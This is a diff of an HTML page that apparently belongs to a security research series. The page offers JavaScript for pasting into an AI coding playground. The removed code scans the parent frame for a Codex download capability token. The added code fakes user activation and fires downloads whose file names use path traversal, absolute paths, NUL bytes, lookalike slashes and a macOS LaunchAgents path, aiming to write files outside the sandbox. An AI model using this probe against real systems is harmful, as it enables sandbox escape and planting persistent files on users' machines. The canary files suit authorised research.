@@ -1,41 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T38c clean copy page</title></head>
+<head><meta charset="utf-8"><title>T39 clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T38c CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T39 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
 <pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
   function log(m) { try { console.log(m); } catch (e) {} }
-  log("T38c iframe inspect " + Date.now());
+  log("T39 filename probes " + Date.now());
   try {
-    var fr = window.parent.document.querySelectorAll("iframe");
-    var f = fr[0];
-    log("src attr: " + String(f.getAttribute("src")).slice(0, 90));
-    log("srcdoc prop len: " + String(f.srcdoc || "").length);
-    var ph = window.parent.document.documentElement.innerHTML;
-    log("parent html len: " + ph.length);
-    var m1 = ph.match(/capability\s*=\s*"([^"]+)"/);
-    log("parent html capability: " + (m1 ? "FOUND len " + m1[1].length : "absent"));
-    var m2 = ph.match(/__CODEX_INLINE_VISUALIZATION_DOWNLOAD_CAPABILITY__/);
-    log("marker in parent html: " + (m2 ? "present" : "absent"));
-    var src = f.getAttribute("src") || "";
-    if (src.indexOf("blob:") === 0) {
-      fetch(src).then(function (r) { return r.text(); }).then(function (t) {
-        log("blob html len: " + t.length);
-        var m3 = t.match(/capability\s*=\s*"([^"]+)"/);
-        log("blob capability: " + (m3 ? "FOUND len " + m3[1].length : "absent"));
-      }, function (e) { log("blob fetch ERR: " + e.message); });
-    }
-    var cd = null;
-    try { cd = f.contentDocument; } catch (e) { log("cd ERR: " + e.name); }
-    if (cd) {
-      var ih = cd.documentElement.innerHTML;
-      log("iframe html len: " + ih.length);
-      var m4 = ih.match(/capability\s*=\s*"([^"]+)"/);
-      log("iframe html capability: " + (m4 ? "FOUND len " + m4[1].length : "absent"));
-    }
-  } catch (e) { log("T38c ERR: " + e.message); }
-  log("T38c done");
+    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
+  } catch (e) { log("norm ERR " + e.message); }
+  var F = String.fromCharCode;
+  var names = [
+    "CANARY-T39a-colon" + F(58) + "x.txt",
+    "CANARY-T39b-nul" + F(0) + "x.txt",
+    "CANARY-T39c-bsl" + F(92) + "x.txt",
+    "CANARY-T39d-frac" + F(0x2044) + "x.txt",
+    "CANARY-T39e-div" + F(0x2215) + "x.txt",
+    "CANARY-T39f-pct%2f%2e%2e.txt",
+    "CANARY-T39g-dot..x.txt",
+    F(47) + "tmp" + F(47) + "CANARY-T39h-abs.txt",
+    ".." + F(47) + ".." + F(47) + "CANARY-T39i-trav.txt",
+    "Library" + F(47) + "LaunchAgents" + F(47) + "CANARY-T39j-agent.txt",
+    (new Array(301).join("A")) + ".txt"
+  ];
+  var i = 0;
+  function next() {
+    if (i >= names.length) { log("T39 all queued"); return; }
+    var n = names[i];
+    var label = "T39-" + i + " len " + n.length;
+    try {
+      var b = new Blob(["T39 canary " + i + " - Pluto Security research, harmless"], { type: "text/plain" });
+      var u = URL.createObjectURL(b);
+      var a = document.createElement("a");
+      a.href = u;
+      a.download = n;
+      a.style.display = "none";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      log(label + " clicked");
+    } catch (e) { log(label + " ERR " + e.message); }
+    i = i + 1;
+    setTimeout(next, 300);
+  }
+  setTimeout(next, 800);
 })();
 </pre>
 <script>
